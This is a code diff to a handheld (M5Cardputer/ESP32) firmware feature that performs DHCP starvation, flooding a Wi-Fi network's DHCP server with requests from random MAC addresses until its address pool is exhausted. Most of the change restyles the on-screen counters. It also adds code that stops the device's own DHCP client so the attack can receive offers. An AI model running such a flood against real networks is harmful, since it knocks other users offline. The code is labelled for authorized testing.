@@ -20,15 +20,16 @@
  * AUTHORIZED TESTING ONLY. This will break a network's DHCP service.
  */
 #include "../../app.h"
-#include "../../theme.h"
 #include "../../ui.h"
 #include "../../input.h"
 #include "../../radio.h"
 #include "../../sfx.h"
 #include "saltyjack.h"
+#include "saltyjack_style.h"
 #include <WiFi.h>
 #include <WiFiUdp.h>
 #include <esp_random.h>
+#include <esp_netif.h>
 
 /* ---- shared state for the feature ---- */
 static WiFiUDP s_udp;
@@ -234,90 +235,86 @@ void feat_saltyjack_dhcp_starve(void)
     auto &d = M5Cardputer.Display;
 
     if (WiFi.status() != WL_CONNECTED || WiFi.localIP() == IPAddress(0,0,0,0)) {
-        ui_clear_body();
-        d.setTextColor(T_BAD, T_BG);
-        d.setCursor(4, BODY_Y + 20); d.print("Not connected.");
-        d.setTextColor(T_FG, T_BG);
-        d.setCursor(4, BODY_Y + 32); d.print("Join target WiFi first");
-        d.setCursor(4, BODY_Y + 42); d.print("via System > Connect.");
-        ui_draw_footer("`=back");
+        sj_frame("DHCP STARVE");
+        d.setTextColor(SJ_BAD, SJ_BG);
+        d.setCursor(SJ_CONTENT_X, BODY_Y + 24); d.print("Not connected.");
+        d.setTextColor(SJ_FG, SJ_BG);
+        d.setCursor(SJ_CONTENT_X, BODY_Y + 38); d.print("Join target WiFi first");
+        d.setCursor(SJ_CONTENT_X, BODY_Y + 48); d.print("via System > Connect.");
+        sj_footer("`=back");
         while (input_poll() == PK_NONE) delay(30);
         return;
     }
 
     s_discover = s_offer = s_request = s_ack = s_nak = 0;
-    s_dhcp_server = WiFi.gatewayIP();  /* best guess */
+    s_dhcp_server = WiFi.gatewayIP();
     s_last_ip = IPAddress(0, 0, 0, 0);
 
+    /* The ESP-IDF internal DHCP client owns port 68 on the STA interface and
+     * will eat our inbound Offers. Stop it for the duration of the attack;
+     * we already have a lease so we can run without it. */
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (sta_netif) esp_netif_dhcpc_stop(sta_netif);
+    delay(50);
+
     if (!s_udp.begin(68)) {
-        ui_toast("UDP bind failed", T_BAD, 1500);
+        if (sta_netif) esp_netif_dhcpc_start(sta_netif);
+        ui_toast("UDP bind failed", 0xFB4A, 1500);
         return;
     }
 
     sfx_deauth_burst();
 
-    ui_clear_body();
-    ui_draw_footer("ESC=stop");
-
+    sj_frame("DHCP STARVE");
     uint32_t last_draw = 0;
-    uint32_t iter = 0;
     while (true) {
         uint8_t mac[6];
         random_mac(mac);
         run_transaction(mac);
-        iter++;
 
         if (millis() - last_draw > 250) {
             last_draw = millis();
-            ui_clear_body();
-            ui_dashboard_chrome(">> DHCP STARVE <<", (iter & 0x3) == 0);
+            sj_frame("DHCP STARVE");
 
-            d.setTextColor(T_FG, T_BG);
-            d.setCursor(4, BODY_Y + 14);
-            d.printf("server: %s", s_dhcp_server.toString().c_str());
+            d.setTextColor(SJ_FG_DIM, SJ_BG);
+            d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y);
+            d.print("srv ");
+            d.setTextColor(SJ_ACCENT, SJ_BG);
+            d.print(s_dhcp_server.toString().c_str());
 
-            d.setCursor(4, BODY_Y + 26);
-            d.printf("discover %lu", (unsigned long)s_discover);
-            d.setCursor(4, BODY_Y + 36);
-            d.printf("offer    %lu", (unsigned long)s_offer);
-            d.setCursor(4, BODY_Y + 46);
-            d.printf("request  %lu", (unsigned long)s_request);
+            sj_row             (SJ_CONTENT_Y + 11, "discover", s_discover);
+            sj_row             (SJ_CONTENT_Y + 20, "offer   ", s_offer);
+            sj_row             (SJ_CONTENT_Y + 29, "request ", s_request);
+            sj_row_highlight   (SJ_CONTENT_Y + 38, "ACK     ", s_ack);
+            sj_row_colored     (SJ_CONTENT_Y + 49, "NAK     ", s_nak, SJ_BAD);
 
-            d.setTextColor(T_GOOD, T_BG);
-            d.setCursor(4, BODY_Y + 56);
-            d.printf("ACK      %lu", (unsigned long)s_ack);
-            d.setTextColor(T_BAD, T_BG);
-            d.setCursor(4, BODY_Y + 66);
-            d.printf("NAK      %lu", (unsigned long)s_nak);
-
-            d.setTextColor(T_DIM, T_BG);
-            d.setCursor(4, BODY_Y + 78);
+            d.setTextColor(SJ_FG_DIM, SJ_BG);
+            d.setCursor(SJ_CONTENT_X, SJ_CONTENT_Y + 60);
             d.printf("last IP: %s", s_last_ip.toString().c_str());
 
             if (s_nak >= 20) {
-                d.setTextColor(T_WARN, T_BG);
-                d.setCursor(4, BODY_Y + 92);
-                d.print("* pool likely exhausted *");
+                sj_print_warn(SJ_CONTENT_Y + 72, "pool exhausted");
+            } else {
+                sj_print_ok(SJ_CONTENT_Y + 72, "flooding...");
             }
 
-            ui_draw_status(radio_name(), s_nak >= 20 ? "STARVED" : "starving");
+            sj_footer(s_nak >= 20 ? "STARVED  `=stop" : "`=stop");
         }
 
-        /* Responsive ESC */
         uint16_t k = input_poll();
         if (k == PK_ESC) break;
     }
 
     s_udp.stop();
-    ui_clear_body();
-    d.setTextColor(T_ACCENT, T_BG);
-    d.setCursor(4, BODY_Y + 2); d.print("STARVE STOPPED");
-    d.setTextColor(T_FG, T_BG);
-    d.setCursor(4, BODY_Y + 20); d.printf("discover %lu", (unsigned long)s_discover);
-    d.setCursor(4, BODY_Y + 30); d.printf("offer    %lu", (unsigned long)s_offer);
-    d.setCursor(4, BODY_Y + 40); d.printf("request  %lu", (unsigned long)s_request);
-    d.setCursor(4, BODY_Y + 50); d.printf("ACK      %lu", (unsigned long)s_ack);
-    d.setCursor(4, BODY_Y + 60); d.printf("NAK      %lu", (unsigned long)s_nak);
-    ui_draw_footer("any key");
+    /* Restart the real DHCP client so the next app on this WiFi still renews. */
+    if (sta_netif) esp_netif_dhcpc_start(sta_netif);
+
+    sj_frame("STARVE STOPPED");
+    sj_row        (BODY_Y + 20, "discover", s_discover);
+    sj_row        (BODY_Y + 30, "offer   ", s_offer);
+    sj_row        (BODY_Y + 40, "request ", s_request);
+    sj_row_colored(BODY_Y + 50, "ACK     ", s_ack, SJ_GOOD);
+    sj_row_colored(BODY_Y + 60, "NAK     ", s_nak, SJ_BAD);
+    sj_footer("any key");
     while (input_poll() == PK_NONE) delay(30);
 }
